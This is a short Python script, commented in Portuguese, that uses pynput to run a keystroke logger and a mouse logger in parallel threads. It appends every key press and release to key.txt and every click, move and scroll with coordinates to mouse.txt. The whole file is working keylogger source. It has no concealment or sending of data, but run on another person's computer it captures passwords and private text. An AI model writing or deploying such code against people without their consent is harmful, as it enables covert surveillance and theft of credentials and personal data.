import threading
from pynput.mouse import Listener
from pynput.keyboard import Listener as KeyboardListener

def mouse():
    def click(x, y, press, button):
        try:
            with open("mouse.txt", "a") as arquivo:
                arquivo.write(f"Botão {button} {'pressionado' if press else 'liberado'} na posição {x} {y}\n")
        except Exception as e:
            with open("mouse.txt", "a") as arquivo:
                arquivo.write(f"Erro ao gravar click: {e}\n")

    def scrol(x, y, dx, dy):
        try:
            with open("mouse.txt", "a") as arquivo:
                arquivo.write(f"Rolagem na posição ({x}, {y}) com dx={dx} e dy={dy}\n")
        except Exception as e:
            with open("mouse.txt", "a") as arquivo:
                arquivo.write(f"Erro ao gravar movimento do Scroll: {e}\n")

    def move(x, y):
        try:
            with open("mouse.txt", "a") as arquivo:
                arquivo.write(f"Mouse movido para a coordenada ({x}, {y})\n")
        except Exception as e:
            with open("mouse.txt", "a") as arquivo:
                arquivo.write(f"Erro ao gravar movimento do mouse: {e}\n")

    with Listener(on_click=click, on_move=move, on_scroll=scrol) as listener:
        listener.join()

def keyboard():
    def press(key):
        try:
            with open("key.txt", "a") as arquivo:
                arquivo.write(f"{key} foi pressionada\n")
        except Exception as e:
            with open("key.txt", "a") as arquivo:
                arquivo.write(f"Erro ao gravar tecla pressionada: {e}\n")

    def release(key):
        try:
            with open("key.txt", "a") as arquivo:
                arquivo.write(f"{key} foi solto\n")
        except Exception as e:
            with open("key.txt", "a") as arquivo:
                arquivo.write(f"Erro ao gravar tecla solta: {e}\n")

    with KeyboardListener(on_press=press, on_release=release) as listener:
        listener.join()

# Criando threads para executar as funções simultaneamente
mouse_thread = threading.Thread(target=mouse)
keyboard_thread = threading.Thread(target=keyboard)

# Iniciando as threads
mouse_thread.start()
keyboard_thread.start()

# Aguardando as threads terminarem
mouse_thread.join()
keyboard_thread.join()
